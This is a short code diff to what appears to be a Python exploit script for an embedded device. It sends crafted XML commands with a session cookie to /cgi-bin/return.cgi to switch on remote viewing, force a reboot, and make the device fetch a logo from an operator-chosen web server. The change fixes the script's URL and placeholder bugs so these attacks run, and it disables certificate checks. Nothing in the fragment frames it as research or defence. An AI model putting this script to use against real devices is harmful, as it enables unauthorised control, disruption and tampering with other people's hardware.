@@ -53,13 +53,15 @@ if action == "Remote":
     remoteViewOn = requests.post(url=url,data=data, verify=False)
     print("Remote View Active")
 elif action == "Reboot":
+    url = "https://"+ host + "/cgi-bin/return.cgi"
     data = {
         "command" :	"<Send><seid>" + cookie + "</seid><Factory>reboot</Factory></Send>"
     }
     remoteViewOn = requests.post(url=url,data=data, verify=False)
     print("Reboot Incoming")
 elif action == "Web":
-    WebServer=YourTargetHere
+    WebServer="YourTargetHere"
+    url = "https://"+ host + "/cgi-bin/return.cgi"
     data = {
         "command"	:"<Send><seid>" + cookie + "</seid><upload><protocol>http</protocol><address>" + WebServer + "</address><logo>TheWeb.png</logo></upload></Send>"
     }
